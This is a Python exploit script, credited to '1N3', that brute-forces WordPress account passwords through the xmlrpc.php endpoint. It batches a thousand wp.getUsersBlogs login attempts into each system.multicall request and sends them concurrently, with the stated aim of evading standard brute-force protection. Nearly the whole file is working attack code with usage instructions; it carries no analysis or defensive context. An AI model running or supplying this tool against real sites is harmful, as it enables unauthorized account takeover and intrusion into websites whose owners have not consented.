#!/usr/bin/python
# Wordpress XML-RPC Brute Force Amplification Exploit by 1N3
# Last Updated: 20170215
# https://crowdshield.com
#
# ABOUT: This exploit launches a brute force amplification attack on target
# Wordpress sites. Since XMLRPC allows multiple auth calls per request,
# amplification is possible and standard brute force protection will not block
# the attack.
#
# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username [username2] [username3]...
#

import time
import requests
import sys
import ssl
from array import *
import asyncio
import aiohttp
from aiohttp.client import ClientSession

WAIT_TIME = 5
PASSWD_PER_REQUEST = 1000
MAX_CONN = 20


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# def banner(argv, usage=False, url=None, users=None):
#     print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
#     print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
#     print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
#     print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
#     print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
#     print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
#     print(bcolors.OKBLUE + "" + bcolors.ENDC)
#     print(bcolors.OKBLUE +
#           "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
#     print(bcolors.OKBLUE +
#           "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
#     print(bcolors.OKBLUE +
#           '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
#     print(bcolors.OKBLUE + "" + bcolors.ENDC)
#     print("")
#     print(bcolors.OKBLUE +
#           "+ -- --=[XML-RPC Brute Force Exploit by 1N3 @ https://crowdshield.com" + bcolors.ENDC)
#     if usage:
#         print(bcolors.OKBLUE +
#               "+ -- --=[Usage: %s http://wordpress.org/xmlrpc.php passwords.txt username [username]..." % (argv[0]) + bcolors.ENDC)
#         sys.exit(0)
#     else:
#         print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
#               url + " with usernames: " + str(users) + "" + bcolors.ENDC)


def send_request(url, data):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = requests.post(url, data, headers={
        'Content-Type': 'application/xml'})
    rsp = req.content.decode('utf-8')
    return rsp


def check_response(content, user, passwd):
    if "incorrect" in content.lower():
        print(bcolors.FAIL + "+ -- --=[Wrong username or password: " +
              user + "/" + passwd + "" + bcolors.ENDC)
    else:
        print(bcolors.OKGREEN + "+ -- --=[Potential match: " + user + "/" + passwd + "" + bcolors.ENDC)
        sys.exit(0)

async def check_pwds(url:str, data, session:ClientSession):
    async with session.post(url=url, data=data, headers={'Content-Type': 'application/xml'}) as response:
        return await response.text()


def template(entries):
    t = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for entry in entries:
        t += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>" % (
            entry.get('user'), entry.get('passwd'))
    t += '</data></array></value></param></params></methodCall>'
    return t


def attack(entries):
    if len(entries) < 1:
        return
    t = template(entries)
    return send_request(url, t)


def find_one(entries):
    for entry in entries:
        t = template([entry])
        content = send_request(url, t)
        check_response(content, entry.get('user'), entry.get('passwd'))

def saveres(res):
    content = str(res)
    filename = str(hash(content)) + ".txt"
    f = open(filename, "w")
    f.write(content)
    f.close()

async def bruteforce(url, passwds, user):
    entries = []
    print("user: %s" % user)

    my_conn = aiohttp.TCPConnector(limit=MAX_CONN)
    async with aiohttp.ClientSession(connector=my_conn) as session:
        tasks=[]
        for num in range(0, len(passwds)):
            if (len(entries) < PASSWD_PER_REQUEST):
                entries.append({"user": user, "passwd": passwds[num]})
                continue
            data = template(entries)
            task = asyncio.ensure_future(check_pwds(url=url, data=data, session=session))
            tasks.append(task)
            entries = []
        res = await asyncio.gather(*tasks,return_exceptions=True)
        saveres(res)

if __name__ == '__main__':
    # if len(sys.argv) < 3:
    #     banner(sys.argv, True)

    url = sys.argv[1]     # SET TARGET
    wordlist = sys.argv[2]     # SET CUSTOM WORDLIST
    users = sys.argv[3:]    # SET USERNAME TO BRUTE FORCE

    if(len(users) < 1):
        sys.exit(0)

    user = users[0]
    with open(wordlist, 'r') as f:
        passwds = f.read().splitlines()
  
        asyncio.run(bruteforce(url, passwds, user))
